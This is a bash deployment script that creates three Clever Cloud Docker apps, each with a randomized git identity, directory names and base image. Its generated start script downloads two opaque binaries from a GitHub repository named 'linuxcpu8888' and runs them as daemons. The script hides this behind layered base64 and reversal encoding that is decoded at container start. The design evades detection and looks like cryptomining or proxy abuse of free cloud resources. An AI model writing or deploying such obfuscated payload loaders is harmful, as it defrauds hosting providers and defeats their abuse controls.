#!/bin/bash
# /docker - Fixed deployment with correct paths and app creation

set -e

# Function to generate random strings
rand_str() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1
}

rand_name() {
    cat /dev/urandom | tr -dc 'A-Za-z' | fold -w "${1:-8}" | head -n 1
}

echo "🔐 Logging into Clever Cloud..."
clever login

for i in 1 2 3; do
    # ============ UNIQUE GIT CONFIG FOR THIS DEPLOYMENT ============
    GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
    GIT_NAME="$(rand_name 6) $(rand_name 8)"
    GIT_COMMIT_MSG="Update $(rand_str 15) $(date +%s)"
    
    git config --global user.email "$GIT_EMAIL"
    git config --global user.name "$GIT_NAME"
    git config --global init.defaultBranch "master"
    
    # ============ UNIQUE DIRECTORY FOR THIS DEPLOYMENT ============
    UNIQUE_DIR="deploy_$(rand_str 12)_$(date +%s)_${RANDOM}"
    APP_DIR="/app/deployments/${UNIQUE_DIR}"
    
    # ============ UNIQUE WORKDIR FOR DOCKERFILE ============
    UNIQUE_WORKDIR="/$(rand_str 15)"
    
    # ============ UNIQUE BINARY NAMES ============
    BIN1="$(rand_str 10)"
    BIN2="$(rand_str 10)"
    
    # ============ UNIQUE APP NAME ============
    APP_NAME="app_$(rand_str 8)_$(date +%s)_${RANDOM}"
    
    echo ""
    echo "========================================="
    echo "[$i/3] Deployment #$i"
    echo "========================================="
    echo "📁 Directory: ${UNIQUE_DIR}"
    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
    echo "📦 Binary1: ${UNIQUE_WORKDIR}/${BIN1}"
    echo "📦 Binary2: ${UNIQUE_WORKDIR}/${BIN2}"
    echo "📧 Git Email: ${GIT_EMAIL}"
    echo "👤 Git Name: ${GIT_NAME}"
    echo "🚀 App Name: ${APP_NAME}"
    echo "========================================="
    
    mkdir -p "$APP_DIR"
    cd "$APP_DIR"
    
    # Obfuscated URLs
    SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
    WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
    
    # Encode URLs to base64
    SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64 -w 0)
    WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64 -w 0)
    
    # Generate random variable names
    VAR1=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
    VAR2=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
    VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
    VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
    VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
    
    # Generate random values
    VAL1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
    VAL2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
    VAL3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
    VAL4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
    VAL5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
    
    # Pool of working Debian and Ubuntu images
    WORKING_IMAGES=(
        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
        "debian:11" "debian:12" "debian:bookworm"
    )
    
    # Pick random image
    RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
    
    # Create start.sh content with FULL PATHS to binaries
    START_SCRIPT_CONTENT="#!/bin/bash
set -e

cd ${UNIQUE_WORKDIR}

export DEBIAN_FRONTEND=noninteractive
export TZ=Etc/UTC
ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime
apt-get update -qq
apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata || true
sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf
echo 'ServerName localhost' >> /etc/apache2/apache2.conf

# Download binaries to WORKDIR with full paths
wget -q -O ${BIN1} \"${SOCAT_URL}\"
wget -q -O ${BIN2} \"${WEB8888_URL}\"
chmod 777 ${BIN1} ${BIN2}

# Start socat daemon from WORKDIR
(${UNIQUE_WORKDIR}/${BIN1} --daemon --port 8080 &)

# Start apache
service apache2 start

sleep 5

# Execute web8888 from WORKDIR with full path
exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAL3} -o ${VAL4} -u ${VAL5} --port 8080"

    # Encode the start script to base64
    START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_CONTENT" | base64 -w 0)
    
    # Random encoding layer
    if [ $((RANDOM % 2)) -eq 0 ]; then
        START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_BASE64" | base64 -w 0)
        DECODE_CMD="base64 -d | base64 -d"
    else
        START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_BASE64" | rev)
        DECODE_CMD="rev | base64 -d"
    fi
    
    # Create Dockerfile with unique WORKDIR
    if [[ $((RANDOM % 2)) -eq 0 ]]; then
        cat > Dockerfile << EOF
FROM ${RANDOM_IMAGE}
WORKDIR ${UNIQUE_WORKDIR}
RUN apt-get update && apt-get install -y curl wget ca-certificates
CMD echo '${START_SCRIPT_BASE64}' | ${DECODE_CMD} | bash
EOF
    else
        cat > Dockerfile << EOF
FROM phemextradebot/cleverbot8888
WORKDIR ${UNIQUE_WORKDIR}
CMD /bin/bash /start
EOF
    fi
    
    echo "✅ Dockerfile created"
    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
    echo "📦 Binary paths: ${UNIQUE_WORKDIR}/${BIN1} and ${UNIQUE_WORKDIR}/${BIN2}"
    
    # Git setup
    git init
    git add .
    git commit -m "$GIT_COMMIT_MSG"
    
    # FIRST: Create the app
    echo "Creating app: ${APP_NAME}"
    clever create --type docker "$APP_NAME"
    
    # SECOND: Deploy the app
    echo "Deploying $APP_NAME..."
    clever deploy
    
    if [ $? -eq 0 ]; then
        echo "✅ App $i/3 deployed: https://$APP_NAME.osc-fr1.scalingo.io"
    else
        echo "❌ App $i/3 deployment failed"
    fi
    
    cd /
    rm -rf "$APP_DIR"
    
    if [ $i -lt 3 ]; then
        echo "Waiting 10 seconds before next deployment..."
        sleep 10
    fi
done

echo ""
echo "========================================="
echo "✅ All 3 apps deployed successfully!"
echo "========================================="
